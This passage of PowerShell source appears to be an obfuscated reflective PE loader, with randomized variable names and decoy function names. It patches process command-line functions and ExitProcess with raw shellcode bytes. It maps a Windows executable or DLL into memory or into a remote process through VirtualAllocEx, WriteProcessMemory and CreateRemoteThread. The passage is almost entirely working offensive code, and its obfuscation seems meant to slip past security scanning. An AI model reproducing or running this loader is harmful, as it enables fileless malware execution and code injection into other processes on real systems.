        $WqGHXyIC99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$BDCVaLLL99 = 0

        [IntPtr]$hLKAMRnU99 = $EeGdRnzz99.GetModuleHandle.Invoke("Kernel32.dll")
        if ($hLKAMRnU99 -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }

        [IntPtr]$quDrzkfC99 = $EeGdRnzz99.GetModuleHandle.Invoke("KernelBase.dll")
        if ($quDrzkfC99 -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        $SCPCflXO99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($soqoeDoI99)
        $QMXzZcAj99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($soqoeDoI99)

        [IntPtr]$MeyzdkYt99 = $EeGdRnzz99.GetProcAddress.Invoke($quDrzkfC99, "GetCommandLineA")
        [IntPtr]$AoBROgXD99 = $EeGdRnzz99.GetProcAddress.Invoke($quDrzkfC99, "GetCommandLineW")

        if ($MeyzdkYt99 -eq [IntPtr]::Zero -or $AoBROgXD99 -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(overheating $MeyzdkYt99). GetCommandLineW: $(overheating $AoBROgXD99)"
        }

        [Byte[]]$qzOvceAZ99 = @()
        if ($WqGHXyIC99 -eq 8)
        {
            $qzOvceAZ99 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $qzOvceAZ99 += 0xb8

        [Byte[]]$XnvqXiZA99 = @(0xc3)
        $bHnbuUGW99 = $qzOvceAZ99.Length + $WqGHXyIC99 + $XnvqXiZA99.Length

        $QOmMKWtW99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bHnbuUGW99)
        $ebsmcZnX99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bHnbuUGW99)
        $EeGdRnzz99.memcpy.Invoke($QOmMKWtW99, $MeyzdkYt99, [UInt64]$bHnbuUGW99) | Out-Null
        $EeGdRnzz99.memcpy.Invoke($ebsmcZnX99, $AoBROgXD99, [UInt64]$bHnbuUGW99) | Out-Null
        $erFfaYzS99 += ,($MeyzdkYt99, $QOmMKWtW99, $bHnbuUGW99)
        $erFfaYzS99 += ,($AoBROgXD99, $ebsmcZnX99, $bHnbuUGW99)

        [UInt32]$BDCVaLLL99 = 0
        $oTFkysOx99 = $EeGdRnzz99.VirtualProtect.Invoke($MeyzdkYt99, [UInt32]$bHnbuUGW99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$BDCVaLLL99)
        if ($oTFkysOx99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $uoEZonuV99 = $MeyzdkYt99
        boogie -Bytes $qzOvceAZ99 -ynTERLem99 $uoEZonuV99
        $uoEZonuV99 = unkind $uoEZonuV99 ($qzOvceAZ99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($QMXzZcAj99, $uoEZonuV99, $false)
        $uoEZonuV99 = unkind $uoEZonuV99 $WqGHXyIC99
        boogie -Bytes $XnvqXiZA99 -ynTERLem99 $uoEZonuV99

        $EeGdRnzz99.VirtualProtect.Invoke($MeyzdkYt99, [UInt32]$bHnbuUGW99, [UInt32]$BDCVaLLL99, [Ref]$BDCVaLLL99) | Out-Null


        [UInt32]$BDCVaLLL99 = 0
        $oTFkysOx99 = $EeGdRnzz99.VirtualProtect.Invoke($AoBROgXD99, [UInt32]$bHnbuUGW99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$BDCVaLLL99)
        if ($oTFkysOx99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $IKDfBJVJ99 = $AoBROgXD99
        boogie -Bytes $qzOvceAZ99 -ynTERLem99 $IKDfBJVJ99
        $IKDfBJVJ99 = unkind $IKDfBJVJ99 ($qzOvceAZ99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($SCPCflXO99, $IKDfBJVJ99, $false)
        $IKDfBJVJ99 = unkind $IKDfBJVJ99 $WqGHXyIC99
        boogie -Bytes $XnvqXiZA99 -ynTERLem99 $IKDfBJVJ99

        $EeGdRnzz99.VirtualProtect.Invoke($AoBROgXD99, [UInt32]$bHnbuUGW99, [UInt32]$BDCVaLLL99, [Ref]$BDCVaLLL99) | Out-Null

        $QCrMgZSD99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach ($Dll in $QCrMgZSD99)
        {
            [IntPtr]$yqKcRBRk99 = $EeGdRnzz99.GetModuleHandle.Invoke($Dll)
            if ($yqKcRBRk99 -ne [IntPtr]::Zero)
            {
                [IntPtr]$VtXfPCIg99 = $EeGdRnzz99.GetProcAddress.Invoke($yqKcRBRk99, "_wcmdln")
                [IntPtr]$LhOuBCyj99 = $EeGdRnzz99.GetProcAddress.Invoke($yqKcRBRk99, "_acmdln")
                if ($VtXfPCIg99 -eq [IntPtr]::Zero -or $LhOuBCyj99 -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }

                $sDaFmFRl99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($soqoeDoI99)
                $inKXyHhE99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($soqoeDoI99)

                $eZptmdXx99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LhOuBCyj99, [Type][IntPtr])
                $OxuGbOqu99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VtXfPCIg99, [Type][IntPtr])
                $FODJWrVU99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WqGHXyIC99)
                $CewDoSWy99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WqGHXyIC99)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($eZptmdXx99, $FODJWrVU99, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OxuGbOqu99, $CewDoSWy99, $false)
                $erFfaYzS99 += ,($LhOuBCyj99, $FODJWrVU99, $WqGHXyIC99)
                $erFfaYzS99 += ,($VtXfPCIg99, $CewDoSWy99, $WqGHXyIC99)

                $oTFkysOx99 = $EeGdRnzz99.VirtualProtect.Invoke($LhOuBCyj99, [UInt32]$WqGHXyIC99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$BDCVaLLL99)
                if ($oTFkysOx99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($sDaFmFRl99, $LhOuBCyj99, $false)
                $EeGdRnzz99.VirtualProtect.Invoke($LhOuBCyj99, [UInt32]$WqGHXyIC99, [UInt32]($BDCVaLLL99), [Ref]$BDCVaLLL99) | Out-Null

                $oTFkysOx99 = $EeGdRnzz99.VirtualProtect.Invoke($VtXfPCIg99, [UInt32]$WqGHXyIC99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$BDCVaLLL99)
                if ($oTFkysOx99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($inKXyHhE99, $VtXfPCIg99, $false)
                $EeGdRnzz99.VirtualProtect.Invoke($VtXfPCIg99, [UInt32]$WqGHXyIC99, [UInt32]($BDCVaLLL99), [Ref]$BDCVaLLL99) | Out-Null
            }
        }


        $erFfaYzS99 = @()
        $iAJWKnZg99 = @() #Array of functions to overwrite so the thread doesn't exit the process

        [IntPtr]$aeiweCYR99 = $EeGdRnzz99.GetModuleHandle.Invoke("mscoree.dll")
        if ($aeiweCYR99 -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$IvsKRquY99 = $EeGdRnzz99.GetProcAddress.Invoke($aeiweCYR99, "CorExitProcess")
        if ($IvsKRquY99 -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $iAJWKnZg99 += $IvsKRquY99

        [IntPtr]$bBtcUjfq99 = $EeGdRnzz99.GetProcAddress.Invoke($hLKAMRnU99, "ExitProcess")
        if ($bBtcUjfq99 -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $iAJWKnZg99 += $bBtcUjfq99

        [UInt32]$BDCVaLLL99 = 0
        foreach ($ZZPBpdcW99 in $iAJWKnZg99)
        {
            $YBFbXXIt99 = $ZZPBpdcW99
            [Byte[]]$qzOvceAZ99 = @(0xbb)
            [Byte[]]$XnvqXiZA99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            if ($WqGHXyIC99 -eq 8)
            {
                [Byte[]]$qzOvceAZ99 = @(0x48, 0xbb)
                [Byte[]]$XnvqXiZA99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$AAZDkQgd99 = @(0xff, 0xd3)
            $bHnbuUGW99 = $qzOvceAZ99.Length + $WqGHXyIC99 + $XnvqXiZA99.Length + $WqGHXyIC99 + $AAZDkQgd99.Length

            [IntPtr]$sLvjNsVy99 = $EeGdRnzz99.GetProcAddress.Invoke($hLKAMRnU99, "ExitThread")
            if ($sLvjNsVy99 -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $oTFkysOx99 = $EeGdRnzz99.VirtualProtect.Invoke($ZZPBpdcW99, [UInt32]$bHnbuUGW99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$BDCVaLLL99)
            if ($oTFkysOx99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $yGAMpexj99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bHnbuUGW99)
            $EeGdRnzz99.memcpy.Invoke($yGAMpexj99, $ZZPBpdcW99, [UInt64]$bHnbuUGW99) | Out-Null
            $erFfaYzS99 += ,($ZZPBpdcW99, $yGAMpexj99, $bHnbuUGW99)

            boogie -Bytes $qzOvceAZ99 -ynTERLem99 $YBFbXXIt99
            $YBFbXXIt99 = unkind $YBFbXXIt99 ($qzOvceAZ99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($DJCHOHLj99, $YBFbXXIt99, $false)
            $YBFbXXIt99 = unkind $YBFbXXIt99 $WqGHXyIC99
            boogie -Bytes $XnvqXiZA99 -ynTERLem99 $YBFbXXIt99
            $YBFbXXIt99 = unkind $YBFbXXIt99 ($XnvqXiZA99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($sLvjNsVy99, $YBFbXXIt99, $false)
            $YBFbXXIt99 = unkind $YBFbXXIt99 $WqGHXyIC99
            boogie -Bytes $AAZDkQgd99 -ynTERLem99 $YBFbXXIt99

            $EeGdRnzz99.VirtualProtect.Invoke($ZZPBpdcW99, [UInt32]$bHnbuUGW99, [UInt32]$BDCVaLLL99, [Ref]$BDCVaLLL99) | Out-Null
        }

        Write-Output $erFfaYzS99
    }

    Function clan
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $scBshLiK99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $EeGdRnzz99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$BDCVaLLL99 = 0
        foreach ($Info in $scBshLiK99)
        {
            $oTFkysOx99 = $EeGdRnzz99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$BDCVaLLL99)
            if ($oTFkysOx99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $EeGdRnzz99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

            $EeGdRnzz99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$BDCVaLLL99, [Ref]$BDCVaLLL99) | Out-Null
        }
    }


    Function guerrilla
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $RIYjzmtQ99,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )

        $rksQRGqN99 = elucidation
        $Win32Constants = spooky
        $PEInfo = amassing -RIYjzmtQ99 $RIYjzmtQ99 -rksQRGqN99 $rksQRGqN99 -Win32Constants $Win32Constants

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $vAXjVxjE99 = unkind ($RIYjzmtQ99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $NShLcbqf99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($vAXjVxjE99, [Type]$rksQRGqN99.IMAGE_EXPORT_DIRECTORY)

        for ($i = 0; $i -lt $NShLcbqf99.NumberOfNames; $i++)
        {
            $SMYBCTGZ99 = unkind ($RIYjzmtQ99) ($NShLcbqf99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $ckvxtLpa99 = unkind ($RIYjzmtQ99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($SMYBCTGZ99, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ckvxtLpa99)

            if ($Name -ceq $FunctionName)
            {
                $zTKtOJNv99 = unkind ($RIYjzmtQ99) ($NShLcbqf99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $WAOXDxWL99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zTKtOJNv99, [Type][UInt16])
                $vxIbQSsC99 = unkind ($RIYjzmtQ99) ($NShLcbqf99.AddressOfFunctions + ($WAOXDxWL99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $AbDmbVeD99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($vxIbQSsC99, [Type][UInt32])
                return unkind ($RIYjzmtQ99) ($AbDmbVeD99)
            }
        }

        return [IntPtr]::Zero
    }


    Function elucidations
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $cprRzWpK99,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $eahMKUAG99,

        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $HrCwxdne99,

        [Parameter(Position = 3)]
        [Bool]
        $ZUvfhSeS99 = $false
        )

        $WqGHXyIC99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $Win32Constants = spooky
        $EeGdRnzz99 = McDonald
        $rksQRGqN99 = elucidation

        $YpYnLYkq99 = $false
        if (($HrCwxdne99 -ne $null) -and ($HrCwxdne99 -ne [IntPtr]::Zero))
        {
            $YpYnLYkq99 = $true
        }

        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = quadricepses -cprRzWpK99 $cprRzWpK99 -rksQRGqN99 $rksQRGqN99
        $cjTOWTzl99 = $PEInfo.OriginalImageBase
        $KudYIzZZ99 = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $KudYIzZZ99 = $false
        }

        $BHxQUhDs99 = $true
        if ($YpYnLYkq99 -eq $true)
        {
            $hLKAMRnU99 = $EeGdRnzz99.GetModuleHandle.Invoke("kernel32.dll")
            $adFraWRE99 = $EeGdRnzz99.GetProcAddress.Invoke($hLKAMRnU99, "IsWow64Process")
            if ($adFraWRE99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]$sbcikSqq99 = $false
            $oTFkysOx99 = $EeGdRnzz99.IsWow64Process.Invoke($HrCwxdne99, [Ref]$sbcikSqq99)
            if ($oTFkysOx99 -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }

            if (($sbcikSqq99 -eq $true) -or (($sbcikSqq99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $BHxQUhDs99 = $false
            }

            $gRCsQSqK99 = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $gRCsQSqK99 = $false
            }
            if ($gRCsQSqK99 -ne $BHxQUhDs99)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $BHxQUhDs99 = $false
            }
        }
        if ($BHxQUhDs99 -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }

        Write-Verbose "Allocating memory for the PE and write its headers to memory"

        [IntPtr]$JbtFabVj99 = [IntPtr]::Zero
        $gjNBMISv99 = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ZUvfhSeS99) -and (-not $gjNBMISv99))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ZUvfhSeS99 flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$JbtFabVj99 = $cjTOWTzl99
        }
        elseif ($ZUvfhSeS99 -and (-not $gjNBMISv99))
        {
            Write-Verbose "PE file doesn't support ASLR but -ZUvfhSeS99 is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ZUvfhSeS99 -and $YpYnLYkq99)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($YpYnLYkq99 -and (-not $gjNBMISv99))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $RIYjzmtQ99 = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $hzcxlNuf99 = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $RIYjzmtQ99. If it is loaded in a remote process, this is the address in the remote process.
        if ($YpYnLYkq99 -eq $true)
        {
            $RIYjzmtQ99 = $EeGdRnzz99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)

            $hzcxlNuf99 = $EeGdRnzz99.VirtualAllocEx.Invoke($HrCwxdne99, $JbtFabVj99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($hzcxlNuf99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($KudYIzZZ99 -eq $true)
            {
                $RIYjzmtQ99 = $EeGdRnzz99.VirtualAlloc.Invoke($JbtFabVj99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $RIYjzmtQ99 = $EeGdRnzz99.VirtualAlloc.Invoke($JbtFabVj99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $hzcxlNuf99 = $RIYjzmtQ99
        }

        [IntPtr]$pWbDFlBH99 = unkind ($RIYjzmtQ99) ([Int64]$PEInfo.SizeOfImage)
        if ($RIYjzmtQ99 -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy($cprRzWpK99, 0, $RIYjzmtQ99, $PEInfo.SizeOfHeaders) | Out-Null


        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = amassing -RIYjzmtQ99 $RIYjzmtQ99 -rksQRGqN99 $rksQRGqN99 -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $pWbDFlBH99
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $hzcxlNuf99
        Write-Verbose "StartAddress: $(overheating $RIYjzmtQ99)    EndAddress: $(overheating $pWbDFlBH99)"


        Write-Verbose "Copy PE sections in to memory"
        indistinctly -cprRzWpK99 $cprRzWpK99 -PEInfo $PEInfo -EeGdRnzz99 $EeGdRnzz99 -rksQRGqN99 $rksQRGqN99


        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        horticulture -PEInfo $PEInfo -cjTOWTzl99 $cjTOWTzl99 -Win32Constants $Win32Constants -rksQRGqN99 $rksQRGqN99


        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($YpYnLYkq99 -eq $true)
        {
            infomercial -PEInfo $PEInfo -EeGdRnzz99 $EeGdRnzz99 -rksQRGqN99 $rksQRGqN99 -Win32Constants $Win32Constants -HrCwxdne99 $HrCwxdne99
        }
        else
        {
            infomercial -PEInfo $PEInfo -EeGdRnzz99 $EeGdRnzz99 -rksQRGqN99 $rksQRGqN99 -Win32Constants $Win32Constants
        }


        if ($YpYnLYkq99 -eq $false)
        {
            if ($KudYIzZZ99 -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                show -PEInfo $PEInfo -EeGdRnzz99 $EeGdRnzz99 -Win32Constants $Win32Constants -rksQRGqN99 $rksQRGqN99
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }


        if ($YpYnLYkq99 -eq $true)
        {
            [UInt32]$TAuMVxYU99 = 0
            $oTFkysOx99 = $EeGdRnzz99.WriteProcessMemory.Invoke($HrCwxdne99, $hzcxlNuf99, $RIYjzmtQ99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$TAuMVxYU99)
            if ($oTFkysOx99 -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }


        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($YpYnLYkq99 -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $KYHuthfc99 = unkind ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $HxfEddrD99 = reallocated @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $IAQnWuHI99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KYHuthfc99, $HxfEddrD99)

                $IAQnWuHI99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $KYHuthfc99 = unkind ($hzcxlNuf99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

                if ($PEInfo.PE64Bit -eq $true)
                {
                    $WhmJswWY99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $yPITPjPZ99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $JeempKks99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    $WhmJswWY99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $yPITPjPZ99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $JeempKks99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $jPPAExXJ99 = $WhmJswWY99.Length + $yPITPjPZ99.Length + $JeempKks99.Length + ($WqGHXyIC99 * 2)
                $ykIXWpCw99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($jPPAExXJ99)
                $YYcfaVeg99 = $ykIXWpCw99

                boogie -Bytes $WhmJswWY99 -ynTERLem99 $ykIXWpCw99
                $ykIXWpCw99 = unkind $ykIXWpCw99 ($WhmJswWY99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($hzcxlNuf99, $ykIXWpCw99, $false)
                $ykIXWpCw99 = unkind $ykIXWpCw99 ($WqGHXyIC99)
                boogie -Bytes $yPITPjPZ99 -ynTERLem99 $ykIXWpCw99
                $ykIXWpCw99 = unkind $ykIXWpCw99 ($yPITPjPZ99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($KYHuthfc99, $ykIXWpCw99, $false)
                $ykIXWpCw99 = unkind $ykIXWpCw99 ($WqGHXyIC99)
                boogie -Bytes $JeempKks99 -ynTERLem99 $ykIXWpCw99
                $ykIXWpCw99 = unkind $ykIXWpCw99 ($JeempKks99.Length)

                $LcUtwSae99 = $EeGdRnzz99.VirtualAllocEx.Invoke($HrCwxdne99, [IntPtr]::Zero, [UIntPtr][UInt64]$jPPAExXJ99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($LcUtwSae99 -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }

                $oTFkysOx99 = $EeGdRnzz99.WriteProcessMemory.Invoke($HrCwxdne99, $LcUtwSae99, $YYcfaVeg99, [UIntPtr][UInt64]$jPPAExXJ99, [Ref]$TAuMVxYU99)
                if (($oTFkysOx99 -eq $false) -or ([UInt64]$TAuMVxYU99 -ne [UInt64]$jPPAExXJ99))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $TiGGpOmj99 = muffling -zzlkUotp99 $HrCwxdne99 -StartAddress $LcUtwSae99 -EeGdRnzz99 $EeGdRnzz99
                $adFraWRE99 = $EeGdRnzz99.WaitForSingleObject.Invoke($TiGGpOmj99, 20000)
                if ($adFraWRE99 -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }

                $EeGdRnzz99.VirtualFreeEx.Invoke($HrCwxdne99, $LcUtwSae99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            [IntPtr]$DJCHOHLj99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($DJCHOHLj99, 0, 0x00)
            $cKwNNMSa99 = Moho -PEInfo $PEInfo -EeGdRnzz99 $EeGdRnzz99 -Win32Constants $Win32Constants -soqoeDoI99 $eahMKUAG99 -DJCHOHLj99 $DJCHOHLj99

            [IntPtr]$nzleBRYV99 = unkind ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(overheating $nzleBRYV99). Creating thread for the EXE to run in."

            $EeGdRnzz99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $nzleBRYV99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$LsDNNiHi99 = [System.Runtime.InteropServices.Marshal]::ReadByte($DJCHOHLj99, 0)
                if ($LsDNNiHi99 -eq 1)
                {
                    clan -scBshLiK99 $cKwNNMSa99 -EeGdRnzz99 $EeGdRnzz99 -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }

        return @($PEInfo.PEHandle, $hzcxlNuf99)
    }


    Function effect
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RIYjzmtQ99
        )

        $Win32Constants = spooky
        $EeGdRnzz99 = McDonald
        $rksQRGqN99 = elucidation

        $PEInfo = amassing -RIYjzmtQ99 $RIYjzmtQ99 -rksQRGqN99 $rksQRGqN99 -Win32Constants $Win32Constants

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$CcGcZQFo99 = unkind ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $LqIgzCyB99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CcGcZQFo99, [Type]$rksQRGqN99.IMAGE_IMPORT_DESCRIPTOR)

                if ($LqIgzCyB99.Characteristics -eq 0 `
                        -and $LqIgzCyB99.FirstThunk -eq 0 `
                        -and $LqIgzCyB99.ForwarderChain -eq 0 `
                        -and $LqIgzCyB99.Name -eq 0 `
                        -and $LqIgzCyB99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $XYhTkdpp99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((unkind ([Int64]$PEInfo.PEHandle) ([Int64]$LqIgzCyB99.Name)))
                $wAMROBuq99 = $EeGdRnzz99.GetModuleHandle.Invoke($XYhTkdpp99)

                if ($wAMROBuq99 -eq $null)
                {
